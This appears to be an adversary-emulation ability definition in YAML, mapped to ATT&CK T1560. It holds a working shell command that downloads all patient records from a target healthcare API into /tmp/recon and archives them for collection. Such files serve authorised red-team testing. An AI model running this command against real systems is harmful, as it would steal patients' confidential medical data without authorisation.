- id: "collection-dump-db"
  name: "Dump Healthcare Database"
  description: "Exfiltrates sensitive healthcare data by dumping the database contents."
  tactic: "collection"
  technique:
    attack_id: "T1560"
    name: "Archive Collected Data"
  platforms:
    linux:
      sh:
        command: |
          OUTDIR="/tmp/recon"; API_BASE="#{api.scheme}://#{api.host}:#{api.port}"; mkdir -p "$OUTDIR"; TS=$(date +%Y%m%d_%H%M%S); RAW="$OUTDIR/db_raw_$TS.json"; CODE=$(curl -s -L -w "%{http_code}" -o "$RAW" --connect-timeout 10 "$API_BASE/patients/"); if [ "$CODE" != "200" ]; then echo "Error HTTP $CODE" >&2; exit 1; fi; tar czf "$OUTDIR/db_dump_$TS.tar.gz" -C "$OUTDIR" "db_raw_$TS.json" && echo "Dump successful: $OUTDIR/db_dump_$TS.tar.gz"